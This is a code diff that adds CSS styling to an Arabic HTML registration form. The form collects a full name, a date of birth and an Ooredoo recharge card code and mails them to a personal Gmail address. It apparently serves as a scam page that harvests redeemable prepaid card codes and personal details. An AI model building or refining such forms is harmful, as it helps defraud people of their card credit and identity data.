@@ -2,19 +2,71 @@
 <html>
 <head>
   <title>نموذج التسجيل</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('background_image.jpg'); /* استبدل 'background_image.jpg' بمسار الصورة الخاصة بك */
+      background-size: cover;
+      background-position: center;
+      margin: 0;
+      padding: 0;
+    }
+
+    h2 {
+      text-align: center;
+      color: #fff;
+    }
+
+    form {
+      width: 300px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.7);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      color: #333;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 8px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #45a049;
+    }
+  </style>
 </head>
 <body>
 
   <h2>نموذج التسجيل</h2>
 
   <form action="mailto:wided.mee@gmail.com" method="post" enctype="text/plain">
-    <label for="fullName">الاسم واللقب:</label><br>
+    <label for="fullName">الاسم واللقب:</label>
     <input type="text" id="fullName" name="fullName"><br><br>
     
-    <label for="dob">تاريخ الولادة:</label><br>
+    <label for="dob">تاريخ الولادة:</label>
     <input type="text" id="dob" name="dob"><br><br>
     
-    <label for="ooredooCard">بطاقة شحن Ooredoo:</label><br>
+    <label for="ooredooCard">بطاقة شحن Ooredoo:</label>
     <input type="text" id="ooredooCard" name="ooredooCard"><br><br>
     
     <input type="submit" value="إرسال">
